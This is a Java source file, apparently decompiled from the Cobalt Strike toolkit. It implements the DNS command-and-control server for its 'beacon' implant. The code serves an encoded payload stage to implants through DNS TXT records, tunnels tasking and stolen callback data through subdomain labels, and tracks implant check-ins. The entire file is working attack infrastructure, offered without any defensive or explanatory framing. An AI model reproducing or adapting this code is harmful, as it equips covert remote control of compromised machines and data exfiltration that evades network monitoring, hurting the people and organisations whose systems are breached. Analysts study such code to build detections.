package beacon;

import beacon.dns.CacheManager;
import beacon.dns.ConversationManager;
import beacon.dns.RecvConversation;
import beacon.dns.SendConversation;
import c2profile.Profile;
import common.ArtifactUtils;
import common.CommonUtils;
import common.MudgeSanity;
import common.ScListener;
import common.StringStack;
import dns.DNSServer;

public class BeaconDNS implements DNSServer.Handler {
    protected Profile c2profile;

    protected BeaconC2 controller;

    protected DNSServer.Response idlemsg;

    protected long idlemask;

    protected String stager_subhost;

    protected String stage = "";

    protected ScListener listener;

    protected CacheManager cache = new CacheManager();

    protected ConversationManager conversations;

    public BeaconDNS(ScListener scListener, Profile profile, BeaconC2 beaconC2) {
        this.c2profile = profile;
        this.controller = beaconC2;
        this.idlemask = CommonUtils.ipToLong(profile.getString(".dns_idle"));
        this.idlemsg = DNSServer.A(this.idlemask);
        this.conversations = new ConversationManager(profile);
        this.listener = scListener;
        if (!"".equals(profile.getString(".dns_stager_subhost"))) {
            this.stager_subhost = profile.getString(".dns_stager_subhost");
        } else {
            this.stager_subhost = null;
        }
    }

    public void setPayloadStage(byte[] arrby) {
        this.stage = this.c2profile.getString(".dns_stager_prepend") + ArtifactUtils.AlphaEncode(arrby);
    }

    protected DNSServer.Response serveStage(String string) {
        int i = CommonUtils.toTripleOffset(string) * 255;
        return (this.stage.length() == 0 || i > this.stage.length()) ? DNSServer.TXT(new byte[0]) : ((i + 255 < this.stage.length()) ? DNSServer.TXT(CommonUtils.toBytes(this.stage.substring(i, i + 255))) : DNSServer.TXT(CommonUtils.toBytes(this.stage.substring(i))));
    }

    public DNSServer.Response respond(String string, int n) {
        synchronized (this) {
            return respond_nosync(string, n);
        }
    }

    public DNSServer.Response respond_nosync(String string, int n) {
        StringStack stringStack = new StringStack(string.toLowerCase(), ".");
        if (stringStack.isEmpty())
            return DNSServer.A(0L);
        String str = stringStack.shift();
        if (str.length() == 3 && "stage".equals(stringStack.peekFirst()))
            return serveStage(str);
        if ("cdn".equals(str) || "api".equals(str) || "www6".equals(str)) {
            stringStack = new StringStack(string.toLowerCase(), ".");
            String str1 = stringStack.shift();
            String str2 = stringStack.shift();
            str = CommonUtils.toNumberFromHex(stringStack.shift(), 0) + "";
            if (this.cache.contains(str, str2))
                return this.cache.get(str, str2);
            SendConversation sendConversation = null;
            if ("cdn".equals(str1)) {
                sendConversation = this.conversations.getSendConversationA(str, str1);
            } else if ("api".equals(str1)) {
                sendConversation = this.conversations.getSendConversationTXT(str, str1);
            } else if ("www6".equals(str1)) {
                sendConversation = this.conversations.getSendConversationAAAA(str, str1);
            }
            DNSServer.Response response = null;
            if (!sendConversation.started() && n == 16) {
                response = DNSServer.TXT(new byte[0]);
            } else if (!sendConversation.started()) {
                byte[] arrby = this.controller.dump(str, 72000, 1048576);
                if (arrby.length > 0) {
                    arrby = this.controller.getSymmetricCrypto().encrypt(str, arrby);
                    response = sendConversation.start(arrby);
                } else if (n == 28 && "www6".equals(str1)) {
                    response = DNSServer.AAAA(new byte[16]);
                } else {
                    response = DNSServer.A(0L);
                }
            } else {
                response = sendConversation.next();
            }
            if (sendConversation.isComplete())
                this.conversations.removeConversation(str, str1);
            this.cache.add(str, str2, response);
            return response;
        }
        if ("www".equals(str) || "post".equals(str)) {
            String str2 = "";
            String str4 = stringStack.shift();
            char c = str4.charAt(0);
            stringStack = new StringStack(string.toLowerCase(), ".");
            String str3 = stringStack.shift();
            if (c == '1') {
                String str5 = stringStack.shift().substring(1);
                str2 = str5;
            } else if (c == '2') {
                String str5 = stringStack.shift().substring(1);
                String str6 = stringStack.shift();
                str2 = str5 + str6;
            } else if (c == '3') {
                String str5 = stringStack.shift().substring(1);
                String str6 = stringStack.shift();
                String str7 = stringStack.shift();
                str2 = str5 + str6 + str7;
            } else if (c == '4') {
                String str5 = stringStack.shift().substring(1);
                String str6 = stringStack.shift();
                String str7 = stringStack.shift();
                String str8 = stringStack.shift();
                str2 = str5 + str6 + str7 + str8;
            }
            String str1 = stringStack.shift();
            str = CommonUtils.toNumberFromHex(stringStack.shift(), 0) + "";
            if (this.cache.contains(str, str1))
                return this.cache.get(str, str1);
            RecvConversation recvConversation = this.conversations.getRecvConversation(str, str3);
            recvConversation.next(str2);
            if (recvConversation.isComplete()) {
                this.conversations.removeConversation(str, str3);
                try {
                    if ("www".equals(str3)) {
                        this.controller.process_beacon_metadata(this.listener, "", recvConversation.result());
                    } else if ("post".equals(str3)) {
                        this.controller.process_beacon_callback(str, recvConversation.result());
                    }
                } catch (Exception exception) {
                    MudgeSanity.logException("Corrupted DNS transaction? " + string + ", type: " + n, exception, false);
                }
            }
            this.cache.add(str, str1, this.idlemsg);
            return this.idlemsg;
        }
        if (CommonUtils.isHexNumber(str) && CommonUtils.isDNSBeacon(str)) {
            str = CommonUtils.toNumberFromHex(str, 0) + "";
            this.cache.purge(str);
            this.conversations.purge(str);
            this.controller.getCheckinListener().update(str, System.currentTimeMillis(), null, false);
            return this.controller.isCheckinRequired(str) ? DNSServer.A(this.controller.checkinMask(str, this.idlemask)) : this.idlemsg;
        }
        if (this.stager_subhost != null && string.length() > 4 && string.toLowerCase().substring(3).startsWith(this.stager_subhost))
            return serveStage(string.substring(0, 3));
        CommonUtils.print_info("DNS: ignoring " + string);
        return this.idlemsg;
    }
}
